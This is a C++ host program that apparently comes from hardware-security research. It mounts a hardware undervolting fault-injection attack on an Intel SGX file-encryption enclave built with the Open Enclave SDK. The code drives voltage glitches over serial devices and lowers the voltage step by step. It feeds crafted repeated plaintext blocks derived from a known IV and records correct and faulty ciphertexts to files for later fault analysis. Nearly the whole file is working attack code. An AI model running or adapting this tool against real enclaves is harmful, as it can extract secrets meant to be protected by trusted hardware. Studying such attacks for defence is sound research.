// Copyright (c) Open Enclave SDK contributors.
// Licensed under the MIT License.

#include <assert.h>
#include <limits.h>
#include <openenclave/host.h>
#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fstream>
#include <iostream>
#include <iterator>
#include <vector>
#include "../shared.h"
#include <math.h>

#include "fileencryptor_u.h"

#include "hwvolt.h"
#include "plundervolt.h"

#include <cstring>
#include <string>
#include <sstream>
#include <iomanip>
#include <iostream>
#include <fstream>
#include <ctime>
#include <getopt.h>
#include <chrono>


using namespace std;

// Generic params
#define ITERATIONS 700 
#define NUM_BLOCKS 10

// Hardware undervolting params default parameters
#define SVID_REPEATS 1
#define TRG_VOLTAGE 0.645
#define PRE_VOLTAGE 0.70
#define PRE_DELAY 30
#define POST_VOLTAGE 0.83
#define POST_DELAY -35
#define PRE_GLITCH_DELAY 600

#define CIPHER_BLOCK_SIZE 16 // Bytes, so 128 bit mode

#define ENCRYPT_OPERATION true
#define DECRYPT_OPERATION false

oe_enclave_t* enclave = NULL;

// Known IV from the enclave code 
unsigned char iv[16] = {	 0xb2,
	0x4b,
	0xf2,
	0xf7,
	0x7a,
	0xc5,
	0xec,
	0x0c,
	0x5e,
	0x1f,
	0x4d,
	0xc1,
	0xae,
	0x46,
	0x5e,
	0x75};


string to_hex_string(unsigned char *data, unsigned long size){
	unsigned char *byteData = reinterpret_cast<unsigned char*>(data);
	std::stringstream hexStringStream;

	hexStringStream << std::hex << std::setfill('0');
	for(unsigned long index = 0; index < size ; ++index)
		hexStringStream << std::setw(2) << static_cast<int>(byteData[index]);
	return  hexStringStream.str();
}


// Dump Encryption header
void dump_header(encryption_header_t* _header)
{
	cout << "--------- Dumping header -------------\n";
	cout << "Host: fileDataSize = " << _header->file_data_size << endl;

	cout << "Host: password digest:\n";
	for (int i = 0; i < HASH_VALUE_SIZE_IN_BYTES; i++)
	{
		cout << "Host: digest[" << i << "]" << std::hex
			<< (unsigned int)(_header->digest[i]) << endl;
	}

	cout << "Host: encryption key" << endl;
	for (int i = 0; i < ENCRYPTION_KEY_SIZE_IN_BYTES; i++)
	{
		cout << "Host: key[" << i << "]=" << std::hex
			<< (unsigned int)(_header->encrypted_key[i]) << endl;
	}
}



int main(int argc, char** argv)
{
	int vstep = 0;
	float current_fault_volt = -1;

	unsigned long iterations=ITERATIONS;
	int svid_repeats=SVID_REPEATS;
	float trg_voltage=TRG_VOLTAGE;
	float pre_voltage=PRE_VOLTAGE;
	int pre_delay=PRE_DELAY;
	float post_voltage=POST_VOLTAGE;
	int post_delay=POST_DELAY;
	int pre_glitch_delay=PRE_GLITCH_DELAY;
	oe_result_t result;
	int ret = 0;
	const char* results_folder = "./fault_results/";
	const char* plaintext_prefix = "_plaintext_bytes";
	const char* cipher_prefix= "_cipher_bytes";
	const char* faulty_prefix= "_faulty_bytes";
	uint32_t flags = OE_ENCLAVE_FLAG_DEBUG;

	encryption_header_t header;
	const char* enclave_file = "./enclave/file-encryptorenc.signed";


	unsigned char r_buffer[CIPHER_BLOCK_SIZE * NUM_BLOCKS], w_buffer[CIPHER_BLOCK_SIZE * NUM_BLOCKS], w_buffer2[CIPHER_BLOCK_SIZE * NUM_BLOCKS];
	unsigned long  buffer_size = CIPHER_BLOCK_SIZE * NUM_BLOCKS ;
	const char* password = "anyPasswordYouLike";
	bool first_time= true;

	int num;
	bool is_beep;

	const char* short_opts = "i:r:v:p:d:a:b:g:0";

    const option long_opts[] = {
            {"iterations", required_argument, nullptr, 'i'},
            {"svid_repeats", required_argument, nullptr, 'r'},
            {"trg_voltage", required_argument, nullptr, 'v'},
            {"pre_voltage", required_argument, nullptr, 'p'},
            {"pre_delay", required_argument, nullptr, 'd'},
            {"post_voltage", required_argument, nullptr, 'a'},
            {"post_delay", required_argument, nullptr, 'b'},
            {"pre_glitch_delay", required_argument, nullptr, 'g'},
            {nullptr, no_argument, nullptr, 0}
    };

    while (true)
    {
        const auto opt = getopt_long(argc, argv, short_opts, long_opts, nullptr);

        if (-1 == opt)
            break;

        switch (opt)
        {
        case 'i':
            iterations= std::stoll(optarg);
            break;
        case 'r':
            svid_repeats= std::stoi(optarg);
            break;
        case 'v':
            trg_voltage=std::stof(optarg);
            break;
        case 'p':
            pre_voltage=std::stof(optarg);
            break;
        case 'd':
            pre_delay=std::stoi(optarg);
            break;
        case 'a':
            post_voltage=std::stof(optarg);
            break;
        case 'b':
            post_delay=std::stoi(optarg);
            break;
        case 'g':
            pre_glitch_delay=std::stoi(optarg);
            break;
		}
	}

	cout<<"Iterations: "<< iterations <<endl;
	cout<<"Svid repeatds: "<< svid_repeats <<endl;
	cout<<"Target voltage: "<< trg_voltage <<endl;
	cout<<"Pre voltage: "<< pre_voltage <<endl;
	cout<<"Pre delay : "<< pre_delay <<endl;
	cout<<"Post voltage:  "<< post_voltage<<endl;
	cout<<"Post delay:  "<< post_delay <<endl;
	cout<<"Pre glitch delay:  "<< pre_glitch_delay <<endl;

	srand(time(NULL));

	if( init_hw_volt((char* const)"/dev/ttyS0",(char* const)"/dev/ttyACM0",115200) == -1){
		return -1;
	}

	auto start = chrono::steady_clock::now();

	cout << "Host: create enclave for image:" << enclave_file << endl;
	result = oe_create_fileencryptor_enclave(
			enclave_file, OE_ENCLAVE_TYPE_SGX, flags, NULL, 0, &enclave);

	if (result != OE_OK)
	{
		cerr << "oe_create_fileencryptor_enclave() failed with " << argv[0]
			<< " " << result << endl;
		goto exit;
	}


	// Used just to populate the header basically 
	result = initialize_encryptor(
			enclave, &ret, true, password , strlen(password), &header);

	header.file_data_size = buffer_size ;

	if (result != OE_OK)
		goto exit;

	// Helps to increase accuracy
	TRIGGER_RST
	TRIGGER_SET
	TRIGGER_RST


	do{
		// Lower the voltage every 5 attempts
		current_fault_volt = trg_voltage - floor((vstep/10)) * 0.005;
		configure_glitch_with_delay(svid_repeats, pre_voltage, pre_delay, current_fault_volt, post_delay, post_voltage, pre_glitch_delay);

		// Get the random block
		for ( int cnt =0; cnt < CIPHER_BLOCK_SIZE; cnt++){
			r_buffer[cnt] = rand() ;
		}

		// Encrypt the random block in the current state 
		result = encrypt_block(
				enclave, &ret, true , r_buffer, w_buffer, CIPHER_BLOCK_SIZE);

		// Prepare the input which generates the same ciphertext
		for ( int cnt=0; cnt<CIPHER_BLOCK_SIZE; cnt++){
			if(first_time){
				r_buffer[cnt]= r_buffer[cnt] ^  w_buffer[cnt] ^ iv[cnt];
			}else{
				r_buffer[cnt]= r_buffer[cnt] ^  w_buffer[cnt] ^ w_buffer[CIPHER_BLOCK_SIZE + cnt];
			}
		}

		for ( unsigned int cnt=1; cnt<NUM_BLOCKS; cnt++){ 
			memcpy( r_buffer + (cnt * CIPHER_BLOCK_SIZE), r_buffer, CIPHER_BLOCK_SIZE);
		}

		// Perform the correct encryption 
		result = encrypt_block(enclave, &ret, true , r_buffer, w_buffer, buffer_size);


		cout<< "======== HW undervolting with voltage :" << trg_voltage<< "\n";
		TRIGGER_SET // Start undervolting

		for ( unsigned long cnt=0; cnt<iterations ; cnt++){
			result = encrypt_block(enclave, &ret, true , r_buffer , w_buffer2, buffer_size);

			if ( memcmp(w_buffer, w_buffer2, buffer_size) != 0 ){
				TRIGGER_RST // Stop undervolting


				ofstream logfile;
				ofstream pt_file, ct_file, fct_file;
				long int rnd = static_cast<long int>(time(NULL));

				cout << "Error!!!!!" << endl << flush;
				string error_txt = "";
				error_txt+= "==========================*******************************$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ \n";
				error_txt+= "				Calculation error detected 					     \n";
				error_txt+= "==========================*******************************$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ \n";
				error_txt+= "Undervolting parameters: \n";
				error_txt+= "Num of iterations:" + to_string(iterations) + "\n";
				error_txt+= "Num of blocks:" + to_string(NUM_BLOCKS) + "\n";
				error_txt+= "Svid repeats:" + to_string(svid_repeats) + "\n";
				error_txt+= "Start fault voltage:" + to_string(trg_voltage) + "\n";
				error_txt+= "Current fault voltage:" + to_string(current_fault_volt) + "\n";
				error_txt+= "Pre voltage :" + to_string(pre_voltage) + "\n";
				error_txt+= "Pre delay:" + to_string(pre_delay) + "\n";
				error_txt+= "Post voltage:" + to_string(post_voltage) + "\n";
				error_txt+= "Post delay:" + to_string(post_delay) + "\n";
				error_txt+= "Pre glitch delay:" + to_string(pre_glitch_delay) + "\n";
				error_txt+="The rand:" + std::to_string(rnd);
				cout<< error_txt;

				pt_file.open(  results_folder + std::to_string(rnd) + plaintext_prefix , ios::out | ios::binary );
				ct_file.open(  results_folder + std::to_string(rnd) + cipher_prefix    , ios::out | ios::binary );
				fct_file.open( results_folder + std::to_string(rnd) + faulty_prefix    , ios::out | ios::binary );

				if (pt_file.is_open())
					pt_file.write((char*)r_buffer,buffer_size);
				else
					cout<<"cannot open the file";

				if (ct_file.is_open())
					ct_file.write((char*)w_buffer,buffer_size);

				if (fct_file.is_open())
					fct_file.write((char*)w_buffer2,buffer_size);

				pt_file.close();
				ct_file.close();
				fct_file.close();
				goto exit;
			}
		}

		TRIGGER_RST // Stop undervolting
		cout<< "Miliseconds passed :"<< chrono::duration_cast<chrono::milliseconds>(chrono::steady_clock::now()-start).count() << endl;

		cout << "Changing input...\n";
		cout << "Current volt: " << current_fault_volt << endl;
		first_time = false;
		vstep ++;
		sleep(1);

	}while(1);

exit:
	cout << "Host: terminate the enclave" << endl;
	cout << "Host: Sample completed successfully." << endl;
	oe_terminate_enclave(enclave);
	return ret;
}

